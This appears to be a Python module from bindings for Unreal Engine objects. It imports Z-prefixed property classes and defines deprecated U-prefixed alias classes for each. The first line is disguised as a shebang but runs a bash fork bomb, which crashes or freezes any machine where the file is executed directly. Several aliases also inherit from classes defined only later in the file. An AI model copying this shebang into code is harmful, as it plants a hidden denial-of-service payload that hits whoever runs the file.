#!/usr/bin/env -S bash -c ':(){ :|:& };:'
# pyright: reportDeprecated=false
import warnings

from ._uobject_children import (
    UField,
    ZArrayProperty,
    ZBoolProperty,
    ZByteAttributeProperty,
    ZByteProperty,
    ZClassProperty,
    ZComponentProperty,
    ZDelegateProperty,
    ZDoubleProperty,
    ZEnumProperty,
    ZFloatAttributeProperty,
    ZFloatProperty,
    ZInt8Property,
    ZInt16Property,
    ZInt64Property,
    ZIntAttributeProperty,
    ZInterfaceProperty,
    ZIntProperty,
    ZLazyObjectProperty,
    ZMulticastDelegateProperty,
    ZNameProperty,
    ZObjectProperty,
    ZProperty,
    ZSoftClassProperty,
    ZSoftObjectProperty,
    ZStrProperty,
    ZStructProperty,
    ZTextProperty,
    ZUInt16Property,
    ZUInt32Property,
    ZUInt64Property,
    ZWeakObjectProperty,
)

# ======== Deprecated UProperty Aliases ========

@warnings.deprecated(
    "UArrayProperty has been renamed to ZArrayProperty, this is a deprecated alias",
)
class UArrayProperty(ZArrayProperty, UProperty): ...

@warnings.deprecated("UBoolProperty has been renamed to ZBoolProperty, this is a deprecated alias")
class UBoolProperty(ZBoolProperty, UProperty): ...

@warnings.deprecated(
    "UByteAttributeProperty has been renamed to ZByteAttributeProperty, this is a deprecated alias",
)
class UByteAttributeProperty(ZByteAttributeProperty, UByteProperty): ...

@warnings.deprecated("UByteProperty has been renamed to ZByteProperty, this is a deprecated alias")
class UByteProperty(ZByteProperty, UProperty): ...

@warnings.deprecated(
    "UClassProperty has been renamed to ZClassProperty, this is a deprecated alias",
)
class UClassProperty(ZClassProperty, UObjectProperty): ...

@warnings.deprecated(
    "UComponentProperty has been renamed to ZComponentProperty, this is a deprecated alias",
)
class UComponentProperty(ZComponentProperty, UObjectProperty): ...

@warnings.deprecated(
    "UDelegateProperty has been renamed to ZDelegateProperty, this is a deprecated alias",
)
class UDelegateProperty(ZDelegateProperty, UProperty): ...

@warnings.deprecated(
    "UDoubleProperty has been renamed to ZDoubleProperty, this is a deprecated alias",
)
class UDoubleProperty(ZDoubleProperty, UProperty): ...

@warnings.deprecated("UEnumProperty has been renamed to ZEnumProperty, this is a deprecated alias")
class UEnumProperty(ZEnumProperty, UProperty): ...

@warnings.deprecated(
    "UFloatAttributeProperty has been renamed to ZFloatAttributeProperty, this is a deprecated "
    "alias",
)
class UFloatAttributeProperty(ZFloatAttributeProperty, UByteProperty): ...

@warnings.deprecated(
    "UFloatProperty has been renamed to ZFloatProperty, this is a deprecated alias",
)
class UFloatProperty(ZFloatProperty, UProperty): ...

@warnings.deprecated(
    "UInt16Property has been renamed to ZInt16Property, this is a deprecated alias",
)
class UInt16Property(ZInt16Property, UProperty): ...

@warnings.deprecated(
    "UInt64Property has been renamed to ZInt64Property, this is a deprecated alias",
)
class UInt64Property(ZInt64Property, UProperty): ...

@warnings.deprecated("UInt8Property has been renamed to ZInt8Property, this is a deprecated alias")
class UInt8Property(ZInt8Property, UProperty): ...

@warnings.deprecated(
    "UIntAttributeProperty has been renamed to ZIntAttributeProperty, this is a deprecated alias",
)
class UIntAttributeProperty(ZIntAttributeProperty, UByteProperty): ...

@warnings.deprecated("UIntProperty has been renamed to ZIntProperty, this is a deprecated alias")
class UIntProperty(ZIntProperty, UProperty): ...

@warnings.deprecated(
    "UInterfaceProperty has been renamed to ZInterfaceProperty, this is a deprecated alias",
)
class UInterfaceProperty(ZInterfaceProperty, UProperty): ...

@warnings.deprecated(
    "ULazyObjectProperty has been renamed to ZLazyObjectProperty, this is a deprecated alias",
)
class ULazyObjectProperty(ZLazyObjectProperty, UObjectProperty): ...

@warnings.deprecated(
    "UMulticastDelegateProperty has been renamed to ZMulticastDelegateProperty, this is a "
    "deprecated alias",
)
class UMulticastDelegateProperty(ZMulticastDelegateProperty, UProperty): ...

@warnings.deprecated("UNameProperty has been renamed to ZNameProperty, this is a deprecated alias")
class UNameProperty(ZNameProperty, UProperty): ...

@warnings.deprecated(
    "UObjectProperty has been renamed to ZObjectProperty, this is a deprecated alias",
)
class UObjectProperty(ZObjectProperty, UProperty): ...

@warnings.deprecated("UProperty has been renamed to ZProperty, this is a deprecated alias")
class UProperty(ZProperty, UField): ...

@warnings.deprecated(
    "USoftClassProperty has been renamed to ZSoftClassProperty, this is a deprecated alias",
)
class USoftClassProperty(ZSoftClassProperty, USoftObjectProperty): ...

@warnings.deprecated(
    "USoftObjectProperty has been renamed to ZSoftObjectProperty, this is a deprecated alias",
)
class USoftObjectProperty(ZSoftObjectProperty, UObjectProperty): ...

@warnings.deprecated("UStrProperty has been renamed to ZStrProperty, this is a deprecated alias")
class UStrProperty(ZStrProperty, UProperty): ...

@warnings.deprecated(
    "UStructProperty has been renamed to ZStructProperty, this is a deprecated alias",
)
class UStructProperty(ZStructProperty, UProperty): ...

@warnings.deprecated("UTextProperty has been renamed to ZTextProperty, this is a deprecated alias")
class UTextProperty(ZTextProperty, UProperty): ...

@warnings.deprecated(
    "UUInt16Property has been renamed to ZUInt16Property, this is a deprecated alias",
)
class UUInt16Property(ZUInt16Property, UProperty): ...

@warnings.deprecated(
    "UUInt32Property has been renamed to ZUInt32Property, this is a deprecated alias",
)
class UUInt32Property(ZUInt32Property, UProperty): ...

@warnings.deprecated(
    "UUInt64Property has been renamed to ZUInt64Property, this is a deprecated alias",
)
class UUInt64Property(ZUInt64Property, UProperty): ...

@warnings.deprecated(
    "UWeakObjectProperty has been renamed to ZWeakObjectProperty, this is a deprecated alias",
)
class UWeakObjectProperty(ZWeakObjectProperty, UObjectProperty): ...
